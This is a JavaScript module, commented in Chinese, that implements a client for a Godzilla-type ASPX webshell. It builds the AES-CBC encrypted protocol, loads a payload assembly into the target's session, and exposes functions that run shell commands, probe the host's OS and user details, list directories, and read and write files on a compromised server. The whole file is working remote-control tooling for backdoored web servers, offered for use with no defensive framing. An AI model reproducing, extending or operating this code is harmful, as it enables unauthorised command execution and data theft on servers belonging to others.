// 哥斯拉型 ASPX 通道（godzilla-aspx，CSHAP_AES_BASE64 同型线协议）：
//   key = md5(密钥源)[0:16]；AES-128-CBC（IV = key 字节）；pass = POST 字段名
//   请求体 = `pass=URL编码(b64(AES-CBC(载荷)))`（初始化=UG.dll 程序集，后续=gzip(Parameter 序列化)）
//   响应 = md5(pass+key)[0:16] + b64(AES-CBC(gzip(Parameter 序列化))) + md5[16:32]（hex 大写）
// 马侧契约（自有 aspx-godzilla 模板）：首请求 Assembly.Load 存 Session；后续 equals 注入
// （byte[] 参数流 / MemoryStream 输出缓冲）→ toString() 执行 → 马侧加密回传。
// 会话：ASP.NET_SessionId cookie 按连接 scope 维护。

import { gzipSync, gunzipSync } from "node:zlib";
import { createCipheriv, createDecipheriv } from "node:crypto";
import { httpRequest, b64, unb64, md5hex, cookieHeaderFor, absorbCookies, clearCookies } from "./http-client.js";
import { serializeParams, parseParams } from "./godzilla-java.js";
import { ASPX_PAYLOADS } from "./payloads-aspx.js";
import { shapeHeaders, stripResponse } from "./profile.js";

const inited = new Map();

const keyOf = (conn) => md5hex(String(conn.secret_key ?? conn.password ?? "")).slice(0, 16);
const markersOf = (conn) => {
	const hex = md5hex(String(conn.password ?? "pass") + keyOf(conn)).toUpperCase();
	return [hex.slice(0, 16), hex.slice(16, 32)];
};

function enc(key, plain) {
	const c = createCipheriv("aes-128-cbc", Buffer.from(key, "utf8"), Buffer.from(key, "utf8"));
	return Buffer.concat([c.update(plain), c.final()]);
}

function dec(key, cipher) {
	const d = createDecipheriv("aes-128-cbc", Buffer.from(key, "utf8"), Buffer.from(key, "utf8"));
	return Buffer.concat([d.update(cipher), d.final()]);
}

// 会话作用域必须绑定目标 URL——同协议探测不同马时，前一会话凭据（nonce/通行证）
// 不得串扰后一目标（曾致跨马协商失败与解密垃圾）
const scopeOf = (conn) => (conn.__scope ?? conn.id ?? conn.url) + "@" + String(conn.url ?? "");

async function postRaw(conn, bodyBuffer) {
	const key = keyOf(conn);
	const pass = String(conn.password ?? "pass") || "pass";
	const scope = scopeOf(conn);
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: shapeHeaders(conn, {
			"content-type": "application/x-www-form-urlencoded",
			...(cookieHeaderFor(scope) ? { cookie: cookieHeaderFor(scope) } : {}),
			...(conn.headers ?? {})
		}),
		body: pass + "=" + encodeURIComponent(b64(enc(key, bodyBuffer))),
		timeoutMs: conn.timeoutMs
	});
	absorbCookies(scope, res.headers);
	if (res.status !== 200) throw new Error(`马侧拒绝（HTTP ${res.status}——密码/密钥源不符或马不存在）`);
	return res;
}

async function post(conn, bodyBuffer) {
	const key = keyOf(conn);
	const res = await postRaw(conn, bodyBuffer);
	const text = stripResponse(conn, res.bodyBuffer.toString("utf8"));
	const [left, right] = markersOf(conn);
	const li = text.indexOf(left), ri = text.lastIndexOf(right);
	if (li === -1 || ri === -1 || ri <= li) throw new Error("响应缺 md5 标记——密钥源可能不匹配");
	let out;
	try { out = dec(key, unb64(text.slice(li + left.length, ri).trim())); } catch { throw new Error("响应解密失败——密钥源可能不匹配"); }
	try { out = gunzipSync(out); } catch { /* 非 gzip 容错直通 */ }
	return out;
}

async function ensureInit(conn) {
	const scope = scopeOf(conn);
	if (inited.get(scope)) return;
	await postRaw(conn, Buffer.from(ASPX_PAYLOADS.UG, "base64"));
	inited.set(scope, true);
}

/** 调用 UG dispatcher 方法 → {status, o:Buffer}。 */
export async function call(conn, method, params = {}) {
	await ensureInit(conn);
	const out = await post(conn, gzipSync(serializeParams({ methodName: method, ...params })));
	const r = parseParams(out);
	const status = r.status?.toString("utf8") ?? "";
	if (status === "err") throw new Error(`载荷执行失败：${r.o?.toString("utf8") ?? ""}`);
	return r.o ?? Buffer.alloc(0);
}

export async function runCommand(conn, command, cwd = "") {
	return (await call(conn, "cmd", { c: command, d: cwd })).toString("utf8");
}

export async function fetchInfo(conn) {
	const token = "WSGA" + Math.random().toString(36).slice(2, 10).toUpperCase();
	const out = (await call({ ...conn, timeoutMs: Math.min(conn.timeoutMs || 8000, 8000) }, "probe", { t: token })).toString("utf8");
	if (!out.startsWith("WSM1|" + token)) return null;
	const f = out.split("|");
	return { token, osName: f[2] ?? "", user: f[3] ?? "", home: f[4] ?? "", userDir: f[5] ?? "", clr: f[6] ?? "", cpus: f[7] ?? "", realPath: f[8] ?? "" };
}

export async function listDir(conn, path) {
	return JSON.parse((await call(conn, "ls", { p: path })).toString("utf8"));
}

export async function readFile(conn, path) {
	return unb64((await call(conn, "read", { p: path })).toString("utf8"));
}

export async function writeFile(conn, path, data) {
	const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
	const CHUNK = 128 * 1024;
	let off = 0, first = true;
	do {
		const chunk = buf.subarray(off, off + CHUNK);
		const r = await call(conn, "write", first ? { p: path, b: chunk } : { p: path, b: chunk, m: "a" });
		if (!r.toString("utf8").startsWith("OK")) throw new Error(`马侧写入失败：${r.toString("utf8")}`);
		off += CHUNK;
		first = false;
	} while (off < buf.length);
	return { ok: true, size: buf.length };
}

const probeToken = () => "WSGA" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	try {
		const info = await fetchInfo(conn);
		if (!info) { invalidate(scopeOf(conn)); return null; }
		return { tokenOutput: "WSM1", basicInfo: info };
	} catch {
		invalidate(scopeOf(conn));
		return null;
	}
}

/** 探测缓存清理（连接删除/编辑后）——会话废弃连 cookie 一起清。 */
export function invalidate(scope) {
	if (scope !== undefined) { inited.delete(scope); clearCookies(scope); }
	else inited.clear();
}

export const godzillaAspxCodec = {
	id: "godzilla-aspx",
	label: "哥斯拉型通道（ASPX·CSHAP_AES_BASE64）",
	langs: ["aspx"],
	caps: { cmd: true, code: false, b64rw: true },
	call
};
